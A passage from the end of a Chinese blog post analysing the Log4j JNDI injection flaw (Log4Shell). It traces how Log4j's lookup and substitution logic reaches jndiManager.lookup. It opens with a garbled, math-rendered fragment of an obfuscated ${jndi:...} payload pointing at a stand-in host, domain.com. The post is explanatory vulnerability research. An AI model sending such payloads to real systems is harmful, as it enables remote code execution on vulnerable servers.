class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">d</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span></span></span>&#123;::-r&#125;</span><span class="token variable"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo>:</mo><mo>:</mo><mo>−</mo><mi>m</mi></mrow><mo>&lt;</mo><mi mathvariant="normal">/</mi><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mo>&gt;</mo><mo>&lt;</mo><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>t</mi><mi>o</mi><mi>k</mi><mi>e</mi><mi>n</mi><mi>v</mi><mi>a</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">&quot;</mi><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&#123;::-m&#125;&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mrel">:</span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">−</span><span class="mord mathnormal">m</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span></span></span>&#123;::-i&#125;</span>😕/domain.com/j<span class="token punctuation">&#125;</span></p>
+<p></code></pre></p>
+ <p><img src="https://img-blog.csdnimg.cn/a4ab0f7f897f435087a5144dc17935ee.png" alt="在这里插入图片描述"></p> 
+ <p><img src="https://img-blog.csdnimg.cn/64cfe705bd6a40d18d0336ccc52591a1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 然后在匹配完后调用resolveVariable解析满足 Lookup 功能的语法 也就是这里调用的lookup去产生漏洞的</p> 
+ <p>如支持的协议 即按照协议的语法去进行解析<br> date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j<br> 这里的作用是<br> 进行执行完lookup,然后将结果替换回原字符串后，再次调用 substitute 方法进行递归解析<br> <img src="https://img-blog.csdnimg.cn/30b0772e37464b88b25acec8ae0592ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt=""></p> 
+ <p>⑥跟lookup方法：产生漏洞的核心原因<br> <img src="https://img-blog.csdnimg.cn/7ff0c11987524e7aac19d9871b600f49.png" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/5c39a355863243a886a58aaaa13953c9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 然后接着跟<br> 发觉核心就两部分<br> ①判断前缀部分<br> ②调用执行部分即调用jndiManager.lookup解析请求,最终形成注入漏洞.<br> <img src="https://img-blog.csdnimg.cn/1e9a7a7d7e95488a9a95207bddd85106.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
+<h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
+<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
+<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
+<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
+</div><div class="article-licensing box"><div class="licensing-title"><p>【Log4J】JAVA安全--log4j漏洞研究分析</p><p><a href="http://example.com/2023/04/27/【Log4J】JAVA安全--log4j漏洞研究分析/">http://example.com/2023/04/27/【Log4J】JAVA安全--log4j漏洞研究分析/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>Brath</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2023-04-27</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2023-04-27</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="sharethis-inline-share-buttons"></div><script src="https://brath.cn" defer></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>爱发电</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="https://brath.cloud/zfb.jpg" alt="支付宝"></span></a><a class="button donate" href="https://brath.cloud/%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98%E5%AE%9D%E4%BA%8C%E5%90%88%E4%B8%80.png" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>送我杯咖啡</span></a><a class="button donate" href="https://brath.cloud/%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98%E5%AE%9D%E4%BA%8C%E5%90%88%E4%B8%80.png" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="https://brath.cloud/wx.jpg" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2023/04/27/%E3%80%90Zookeeper%E3%80%91Zookeeper%E5%85%A5%E9%97%A8%E7%9C%8B%E8%BF%99%E7%AF%87%E5%B0%B1%E5%A4%9F%E4%BA%86/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">【Zookeeper】Zookeeper入门看这篇就够了</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2023/04/27/%E3%80%90%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%9123%20%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3%EF%BC%88%E5%85%A823%E7%A7%8D%EF%BC%89/"><span class="level-item">【设计模式】23 种设计模式详解（全23种）</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div id="SOHUCS" sid="2023/04/27/【Log4J】JAVA安全--log4j漏洞研究分析/"></div><script charset="utf-8" src="https://changyan.sohu.com/upload/changyan.js"></script><script>window.changyan.api.config({appid: 'cywzQRCbe',conf: '485cd826ef6d780dcea71d0f3b37304a'});</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-04-27T09:20:49.000Z">2023-04-27</time></p><p class="title"><a href="/2023/04/27/%E3%80%90Dubbo%E3%80%91Dubbo%E8%AF%A6%E8%A7%A3%EF%BC%8C%E7%94%A8%E5%BF%83%E7%9C%8B%E8%BF%99%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B0%B1%E5%A4%9F%E4%BA%86%E3%80%90%E9%87%8D%E7%82%B9%E3%80%91/">【Dubbo】Dubbo详解，用心看这一篇文章就够了【重点】</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-04-27T09:20:49.000Z">2023-04-27</time></p><p class="title"><a href="/2023/04/27/%E3%80%90MySql%E3%80%9121%E4%B8%AAMySQL%E8%A1%A8%E8%AE%BE%E8%AE%A1%E7%9A%84%E7%BB%8F%E9%AA%8C%E5%87%86%E5%88%99/">【MySql】21个MySQL表设计的经验准则</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-04-27T09:20:49.000Z">2023-04-27</time></p><p class="title"><a href="/2023/04/27/%E3%80%90Zookeeper%E3%80%91Zookeeper%E5%85%A5%E9%97%A8%E7%9C%8B%E8%BF%99%E7%AF%87%E5%B0%B1%E5%A4%9F%E4%BA%86/">【Zookeeper】Zookeeper入门看这篇就够了</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-04-27T09:20:48.000Z">2023-04-27</time></p><p class="title"><a href="/2023/04/27/%E3%80%90Log4J%E3%80%91JAVA%E5%AE%89%E5%85%A8--log4j%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/">【Log4J】JAVA安全--log4j漏洞研究分析</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-04-27T09:20:48.000Z">2023-04-27</time></p><p class="title"><a href="/2023/04/27/%E3%80%90%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%9123%20%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3%EF%BC%88%E5%85%A823%E7%A7%8D%EF%BC%89/">【设计模式】23 种设计模式详解（全23种）</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2023/"><span class="level-start"><span class="level-item">2023</span></span><span class="level-end"><span class="level-item tag">31</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/"><span class="level-start"><span class="level-item">2022</span></span><span class="level-end"><span class="level-item tag">51</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/"><span class="level-start"><span class="level-item">2021</span></span><span class="level-end"><span class="level-item tag">44</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/"><span class="level-start"><span class="level-item">2020</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">InterviewCoder</p><p class="is-size-6 is-block">面试记官方公众号</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">133</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://mp.weixin.qq.com/s/jWs6lLHl5L-atXJhHc4YvA" target="_blank" rel="noopener">关注我</a></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://brath.cloud/me.png" alt="Brath"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Brath</p><p class="is-size-6 is-block">技能改变人生，知识改变命运。</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>中国·江苏·无锡</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">133</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/Guoqing815" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/Guoqing815"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Gitee" href="https://gitee.com/Guoqing-Li"><i class="fab fa-gitee"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://schokolade.cn/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">泠灵(特别呜谢)</span></span><span class="level-right"><span class="level-item tag">schokolade.cn</span></span></a></li><li><a class="level is-mobile" href="https://gitee.com/Guoqing-Li" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Gitee(码云)</span></span><span class="level-right"><span class="level-item tag">gitee.com</span></span></a></li><li><a class="level is-mobile" href="https://blog.csdn.net/Brath?type=blog" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">CSDN</span></span><span class="level-right"><span class="level-item tag">blog.csdn.net</span></span></a></li><li><a class="level is-mobile" href="https://juejin.cn/user/settings/profile" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">掘金</span></span><span class="level-right"><span class="level-item tag">juejin.cn</span></span></a></li><li><a class="level is-mobile" href="https://oss.console.aliyun.com/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">AliCloud(阿里云)</span></span><span class="level-right"><span class="level-item tag">oss.console.aliyun.com</span></span></a></li><li><a class="level is-mobile" href="https://cloud.tencent.com/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">TencentCloud(腾讯云)</span></span><span class="level-right"><span class="level-item tag">cloud.tencent.com</span></span></a></li><li><a class="level is-mobile" href="https://www.zhipin.com/web/user/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">BOSS</span></span><span class="level-right"><span class="level-item tag">www.zhipin.com</span></span></a></li><li><a class="level is-mobile" href="https://www.bilibili.com/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bilibili(B站)</span></span><span class="level-right"><span class="level-item tag">www.bilibili.com</span></span></a></li></ul></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="https://brath.cloud/me.png" alt="Brath-Blog" height="28"></a><p class="is-size-7"><span>&copy; 2023 Brath</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">共<span id="busuanzi_value_site_uv">0</span>个访客</span></p><p class="is-size-7">© 2029</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "此网站使用Cookie来改善您的体验。",
+          dismiss: "知道了！",
+          allow: "允许使用Cookie",
+          deny: "拒绝",
+          link: "了解更多",
+          policy: "Cookie政策",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
